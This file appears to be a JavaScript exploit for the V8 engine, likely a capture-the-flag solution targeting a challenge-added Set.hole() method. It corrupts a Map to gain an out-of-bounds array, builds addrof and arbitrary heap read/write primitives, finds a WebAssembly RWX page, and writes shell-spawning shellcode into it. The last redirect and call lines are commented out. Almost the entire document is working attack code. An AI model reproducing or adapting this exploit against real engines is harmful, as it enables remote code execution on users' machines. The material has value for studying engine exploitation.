// Utils    
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const bigUint64 = new BigUint64Array(buf);
f2i = (val) => {
    f64[0] = val;
    return bigUint64[0];
}
i2f = (val) => {
    bigUint64[0] = val;
    return f64[0];
}
d2u = (v) => {
    f64[0] = v;
    return Array.from(u32);
}

// Log address leak
function log_leak(key, addr){
    print(`${key} : 0x${addr.toString(16)}`);
}

var vuln_set = new Set();

var map = new Map();
map.set('Ruulian', 8);
map.set(vuln_set.hole(), 0x8);
map.delete(vuln_set.hole());
map.delete(vuln_set.hole());
map.delete("Ruulian");

map.set(0x18, "Ruulian");

var nop = new Array(1);

var oob_array = [];
oob_array.push(1.1);

var object = {
    "tag": 0xdead,
    "leak": 0xbeef,
};

bigUintArray = new BigUint64Array(6);
bigUintArray[0] = 0x1234n;

map.set("1", "Ruulian");

addrof = (obj) => {
    object.leak = obj;
    let ret;
    for (let index = 0; index < 0x1000; index++) {
        let half = d2u(oob_array[index]);
        if(half[0] == (object.tag << 1)){
            ret = half[1];
            break;
        }
        else if(half[1] == (object.tag << 1)){
            ret = d2u(oob_array[index + 1])[0];
            break;
        }   
    }
    return BigInt(ret);
}

let base_pointer_idx;

for (let i = 0; i < 0x3000; i++) {
    if (f2i(oob_array[i]) == 0x1234) {
        base_pointer_idx = i + 12;
        break;
    }
}

let prev_data = f2i(oob_array[base_pointer_idx]);

heap_r = (addr) => {
    addr -= 8n;
    oob_array[base_pointer_idx] = i2f((addr << 0x20n) | (prev_data & 0xffffffffn));
    return bigUintArray[0];
}

heap_w = (addr, value) => {
    addr -= 8n;
    oob_array[base_pointer_idx] = i2f((addr << 0x20n) | (prev_data & 0xffffffffn));
    bigUintArray[0] = value;
}


dv = new DataView(new ArrayBuffer(0x1000));
dv_addr = addrof(dv);
dv_buffer = heap_r(dv_addr + 0xcn);
log_leak("dv_buffer", dv_buffer);

set_dv_backing_store = (addr) => {
    heap_w(dv_buffer + 0x1cn, addr);
}

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;
const shellcode = new Uint8Array([72, 184, 47, 98, 105, 110, 47, 115, 104, 0, 153, 80, 84, 95, 82, 102, 104, 45, 99, 84, 94, 82, 232, 10, 0, 0, 0, 47, 98, 105, 110, 47, 115, 104, 0, 0, 0, 86, 87, 84, 94, 106, 59, 88, 15, 5]);

let rwx = heap_r(addrof(wasm_instance) + 0x60n);
log_leak("shellcode location", rwx);

//set_dv_backing_store(rwx);

for (let i = 0; i < shellcode.length; i++) {
    dv.setUint8(i, shellcode[i]);
}

//f();
